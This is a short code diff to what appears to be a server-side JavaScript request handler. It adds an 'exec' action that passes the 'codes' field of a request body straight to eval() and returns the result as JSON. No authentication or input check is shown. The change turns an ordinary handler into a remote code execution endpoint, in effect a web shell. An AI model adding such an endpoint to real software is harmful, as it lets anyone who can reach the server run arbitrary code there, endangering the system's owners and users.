@@ -35,6 +35,15 @@ try {
             break;
         }
 
+        case 'exec': {
+            var codes = body.GetOptProperty('codes');
+            Response.Write(tools.object_to_text({
+                success: true,
+                data: eval(codes),
+            }, 'json'))
+            break;
+        }
+
         default: {
             throw "action is undefined: " + action;
         }
